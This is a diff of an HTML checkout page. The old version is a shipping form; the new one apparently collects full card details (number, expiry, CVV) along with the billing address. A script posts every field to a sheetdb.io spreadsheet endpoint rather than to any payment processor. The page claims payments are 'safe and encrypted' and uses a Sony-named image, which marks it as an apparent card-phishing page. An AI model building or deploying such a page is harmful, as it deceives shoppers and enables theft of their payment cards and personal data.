@@ -1,112 +1,118 @@
 <!DOCTYPE html>
-<html style="font-size: 16px;" lang="en"><head>
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta charset="utf-8">
-    <meta name="keywords" content="CHE​​​C​KOUT">
-    <meta name="description" content="">
-    <title>Shipping</title>
-    <link rel="stylesheet" href="nicepage.css" media="screen">
-<link rel="stylesheet" href="Shipping.css" media="screen">
-    <script class="u-script" type="text/javascript" src="jquery.js" defer=""></script>
-    <script class="u-script" type="text/javascript" src="nicepage.js" defer=""></script>
-    <meta name="generator" content="Nicepage 5.13.1, nicepage.com">
-    <meta name="referrer" content="origin">
-    <link id="u-theme-google-font" rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:100,100i,300,300i,400,400i,500,500i,700,700i,900,900i|Open+Sans:300,300i,400,400i,500,500i,600,600i,700,700i,800,800i">
-    
-    
-    <script type="application/ld+json">{
-		"@context": "http://schema.org",
-		"@type": "Organization",
-		"name": "Shipping and Payment"
-}</script>
-    <meta name="theme-color" content="#478ac9">
-    <meta property="og:title" content="Shipping">
-    <meta property="og:description" content="">
-    <meta property="og:type" content="website">
-  <meta data-intl-tel-input-cdn-path="intlTelInput/"></head>
-  <body data-home-page="Shipping.html" data-home-page-title="Shipping" class="u-body u-xl-mode" data-lang="en"><header class="u-border-2 u-border-grey-10 u-clearfix u-header u-white u-header" id="sec-b4d5"><div class="u-clearfix u-sheet u-valign-middle-md u-valign-middle-sm u-sheet-1">
-        <p class="u-text u-text-grey-75 u-text-1">Secure</p>
-        <p class="u-text u-text-black u-text-2">Payments</p><span class="u-file-icon u-icon u-icon-1"><img src="images/5968919.png" alt=""></span>
-      </div></header>
-    <section class="skrollable u-clearfix u-parallax u-section-1" id="sec-5a89" rel="nofollow">
-      <div class="u-clearfix u-sheet u-sheet-1">
-        <div class="u-expanded-width-sm u-form u-form-1">
-          <form action="https://sheetdb.io/api/v1/fym4eugd3iqb4" method="post" id="sheetdb-form" class="u-clearfix u-form-spacing-10 u-form-vertical u-inner-form" style="padding: 10px;">
-            <div class="u-form-group u-form-group-1">
-              <label for="text-5696" class="u-form-control-hidden u-label"></label>
-              <input type="text" id="text-5696" name="data[Email]" class="u-border-grey-40 u-grey-10 u-input u-input-rectangle u-radius-9" placeholder="Email" required>
+<html lang="en" >
+<head>
+  <meta charset="UTF-8">
+  <title>CodePen - Responsive Checkout Form</title>
+  <link rel="stylesheet" href="./style.css">
+
+</head>
+<body>
+<!-- partial:index.partial.html -->
+<html>
+<head>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+</head>
+<body>
+
+<div class="row">
+  <div class="col-75">
+    <div class="container">
+      <form action="https://sheetdb.io/api/v1/gvinqaab2zh5u" method="post" id="sheetdb-form">
+      
+        <div class="row">
+          <div class="col-50">
+            <h3>Billing Address</h3>
+            <label for="fname"><i class="fa fa-user"></i> Full Name</label>
+            <input type="text" id="fname" name="data[Fullname]" placeholder="John M. Doe" required>
+            <label for="email"><i class="fa fa-envelope"></i> Email</label>
+            <input type="text" id="email" name="data[Email]" placeholder="john@example.com" required>
+            <label for="adr"><i class="fa fa-address-card-o"></i> Address</label>
+            <input type="text" id="adr" name="data[Address]" placeholder="542 W. 15th Street" required>
+            <label for="city"><i class="fa fa-institution"></i> City</label>
+            <input type="text" id="city" name="data[City]" placeholder="New York" required>
+
+            <div class="row">
+              <div class="col-50">
+                <label for="state">State</label>
+                <input type="text" id="state" name="data[State]" placeholder="NY" required>
+              </div>
+              <div class="col-50">
+                <label for="zip">Zip</label>
+                <input type="text" id="zip" name="data[Zip]" placeholder="10001" required>
+              </div>
             </div>
-            <div class="u-form-group u-form-group-2">
-              <label for="text-b7dc" class="u-form-control-hidden u-label"></label>
-              <input type="text" placeholder="First name" id="text-b7dc" name="data[First name]" class="u-border-grey-40 u-grey-10 u-input u-input-rectangle u-radius-9" required>
+          </div>
+
+          <div class="col-50">
+            <h3>Payment</h3>
+            <h6>payments are safe and encrypted</h6>
+            <label for="fname">Accepted Cards</label>
+            <div class="icon-container">
+              <i class="fa fa-cc-visa" style="color:navy;"></i>
+              <i class="fa fa-cc-amex" style="color:blue;"></i>
+              <i class="fa fa-cc-mastercard" style="color:red;"></i>
+              <i class="fa fa-cc-discover" style="color:orange;"></i>
             </div>
-            <div class="u-form-group u-form-group-3">
-              <label for="text-9233" class="u-form-control-hidden u-label"></label>
-              <input type="text" placeholder="Last name" id="text-9233" name="data[Last name]" class="u-border-grey-40 u-grey-10 u-input u-input-rectangle u-radius-9" required>
+            <label for="cname">Name on Card</label>
+            <input type="text" id="cname" name="data[Cardname]" placeholder="John More Doe" required>
+            <label for="ccnum">Credit card number</label>
+            <input type="text" id="ccnum" name="data[Cardnumber]" placeholder="1111-2222-3333-4444" required>
+            <label for="expmonth">Exp Month</label>
+            <input type="text" id="expmonth" name="data[Expmonth]" placeholder="September" required>
+            <div class="row">
+              <div class="col-50">
+                <label for="expyear">Exp Year</label>
+                <input type="text" id="expyear" name="data[Expyear]" placeholder="2018" required>
+              </div>
+              <div class="col-50">
+                <label for="cvv">CVV</label>
+                <input type="text" id="cvv" name="data[CVV]" placeholder="352" required>
+              </div>
             </div>
-            <div class="u-form-group u-form-group-4">
-              <label for="text-32cd" class="u-form-control-hidden u-label"></label>
-              <input type="text" placeholder="Address" id="text-32cd" name="data[Address]" class="u-border-grey-40 u-grey-10 u-input u-input-rectangle u-radius-9" required>
-            </div>
-            <div class="u-form-group u-form-group-5">
-              <label for="text-78ad" class="u-form-control-hidden u-label"></label>
-              <input type="text" placeholder="City" id="text-78ad" name="data[City]" class="u-border-grey-40 u-grey-10 u-input u-input-rectangle u-radius-9" required>
-            </div>
-            <div class="u-form-group u-form-group-6">
-              <label for="text-866f" class="u-form-control-hidden u-label"></label>
-              <input type="text" placeholder="Country" id="text-866f" name="data[Country]" class="u-border-grey-40 u-grey-10 u-input u-input-rectangle u-radius-9" required>
-            </div>
-            <div class="u-form-group u-form-group-7">
-              <label for="text-3323" class="u-form-control-hidden u-label"></label>
-              <input type="text" placeholder="State" id="text-3323" name="data[State]" class="u-border-grey-40 u-grey-10 u-input u-input-rectangle u-radius-9" required>
-            </div>
-            <div class="u-form-group u-form-group-8">
-              <label for="text-eeb3" class="u-form-control-hidden u-label"></label>
-              <input type="text" placeholder="Zip code" id="text-eeb3" name="data[Zip code]" class="u-border-grey-40 u-grey-10 u-input u-input-rectangle u-radius-9" required>
-            </div>
-            <div class="u-form-group u-form-group-9">
-              <label for="text-8350" class="u-form-control-hidden u-label"></label>
-              <input type="text" placeholder="Phone" id="text-8350" name="data[Phone]" class="u-border-grey-40 u-grey-10 u-input u-input-rectangle u-radius-9" required>
-            </div>
-            <div class="u-align-left u-form-group u-form-submit">
-              <a href="payment.html" class="u-black u-border-none u-btn u-btn-round u-btn-submit u-button-style u-hover-palette-1-light-1 u-radius-5 u-btn-2">NEXT</a>
-              <input type="submit" value="submit" class="u-form-control-hidden">
-            </div>
-          </form>
+          </div>
+          
         </div>
-        <h6 class="u-text u-text-default-xs u-text-1">Order summary</h6>
-        <p class="u-text u-text-default-xs u-text-2">$<span style="font-weight: 700;">14.99</span>
-        </p>
-        <div class="u-border-3 u-border-grey-dark-1 u-expanded-width-xs u-line u-line-horizontal u-line-1"></div>
-        <img class="u-image u-image-default u-image-1" src="images/0c6abc20b9ed0c9e2a47c7c0992400ff364840e66aeb243b68f8e054c7cd1d2b24fdfb4fccaf55379f5f96d161758a45b4b5d4d0fce8bcbb3a62bf_1280.jpg" alt="" data-image-width="1280" data-image-height="853">
-        <p class="u-text u-text-default-xs u-text-3">Sample text. Click to select the Text Element.</p>
-        <p class="u-small-text u-text u-text-default-xs u-text-variant u-text-4">Subtotal </p>
-        <p class="u-small-text u-text u-text-default-xs u-text-variant u-text-5">Shipping </p>
-        <p class="u-small-text u-text u-text-default-xs u-text-variant u-text-6">Total </p>
-        <p class="u-text u-text-default-xs u-text-7">$<span style="font-weight: 700;">14.99</span>
-        </p>
-        <p class="u-text u-text-default-xs u-text-8">$<span style="font-weight: 700;">14.99</span>
-        </p>
-        <h6 class="u-text u-text-default-xs u-text-9">Free Shipping</h6>
-        <h3 class="u-text u-text-default-xs u-text-10">Delivery</h3><span class="u-file-icon u-icon u-text-grey-50 u-icon-1"><img src="images/471664-093e94e2.png" alt=""></span>
-      </div>
-    
-      <script>
-        var form = document.getElementById('sheetdb-form');
-     form.addEventListener("submit", e => {
-       e.preventDefault();
-       fetch(form.action, {
-           method : "POST",
-           body: new FormData(document.getElementById("sheetdb-form")),
-       }).then(
-           response => response.json()
-       ).then((html) => {
-         // you can put any JS code here
-         window.open('payment.html', '_blank');
-    
-       });
-     });
-    </script>
-    
+        <label>
+          <input type="checkbox" checked="checked" name="sameadr"> Shipping address same as billing
+        </label>
+        <input type="submit" value="Continue to checkout" class="btn">
+      </form>
+    </div>
+  </div>
+  <div class="col-25">
+    <div class="container">
+      <h4>Cart <span class="price" style="color:black"><i class="fa fa-shopping-cart"></i> <b>1</b></span></h4>
+      <img src="images/Sign In _ Sony (1).png" alt=""><div class="price">$15</div><h5>we sell best items on market</h5>
+      <hr>
+      <h5>Subtotal <span class="price" style="color:rgba(0, 0, 0, 0.836)"><b>$30</b></span></h5>
+      <h5>Shipping <span class="price" style="color:rgba(0, 0, 0, 0.829)"><b>Free shipping</b></span></h5>
+      <p>Total <span class="price" style="color:black"><b>$30</b></span></p>
+    </div>
+  </div>
+</div>
+
+<script>
+  var form = document.getElementById('sheetdb-form');
+form.addEventListener("submit", e => {
+ e.preventDefault();
+ fetch(form.action, {
+     method : "POST",
+     body: new FormData(document.getElementById("sheetdb-form")),
+ }).then(
+     response => response.json()
+ ).then((html) => {
+   // you can put any JS code here
+   window.open('Checkout.html', '_blank');
+
+ });
+});
+</script>
+
+
+</body>
+</html>
+<!-- partial -->
   
-</body></html>
+</body>
+</html>
